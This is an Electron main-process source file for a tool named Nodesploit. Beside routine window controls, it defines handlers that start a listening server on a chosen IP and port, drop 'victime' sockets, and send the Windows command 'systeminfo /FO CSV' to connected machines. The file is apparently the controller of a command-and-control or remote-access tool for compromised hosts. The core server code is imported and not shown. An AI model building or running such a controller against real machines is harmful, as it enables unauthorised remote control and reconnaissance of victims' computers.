'use strict'

import { app, ipcMain } from 'electron'
import { installVueDevtools } from 'vue-cli-plugin-electron-builder/lib'
import { createMainWindow } from './window'
import { Nodesploit } from './server'

const isDevelopment = process.env.NODE_ENV !== 'production'

// Window Browser
let mainWin

// Exit cleanly on request from parent process in development mode.
if (isDevelopment) {
  if (process.platform === 'win32') {
    process.on('message', (data) => {
      if (data === 'graceful-exit') {
        app.quit()
      }
    })
  } else {
    process.on('SIGTERM', () => {
      app.quit()
    })
  }
}

// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
// Some APIs can only be used after this event occurs.
app.on('ready', async () => {
  if (isDevelopment && !process.env.IS_TEST) {
    // Install Vue Devtools
    try {
      await installVueDevtools()
    } catch (e) {
      console.error('Vue Devtools failed to install:', e.toString())
    }
  }

  mainWin = createMainWindow()
  mainWin.webContents.on('did-finish-load', () => {
    mainWin.show()
  })

  mainWin.on('closed', () => {
    mainWin = null
  })

  var ns = new Nodesploit(mainWin)

  ipcMain.on('close-app', () => {
    app.quit()
  })

  ipcMain.on('maximize-app', () => {
    if (ns.mainWin.isFullScreen()) {
      ns.mainWin.setFullScreen(false)
    } else {
      ns.mainWin.setFullScreen(true)
    }
  })

  ipcMain.on('minimize-app', () => {
    ns.mainWin.minimize()
  })

  /**
 * @param  {Object} connection - Keys (ip:String) (port:Number) (remember?:Boolean)
 * IP & Port & Remember are stored in vuex
 * Event from renderer to listen into server.
 */
  ipcMain.handle('serverlisten', (event, connection) => {
    ns.createServer(connection)
  })

  ipcMain.handle('server-stoplisten', () => {
    ns.closeServer()
  })

  /**
 * @param  {Socket id} id
 * Delete victime from child socket
 */
  ipcMain.on('delete_victime', (event, id) => {
    ns.deleteVictime(id)
  })

  ipcMain.on('getInformation', (event, id) => {
    ns.sockets.get(id).write('systeminfo /FO CSV' + '\n')
  })
})
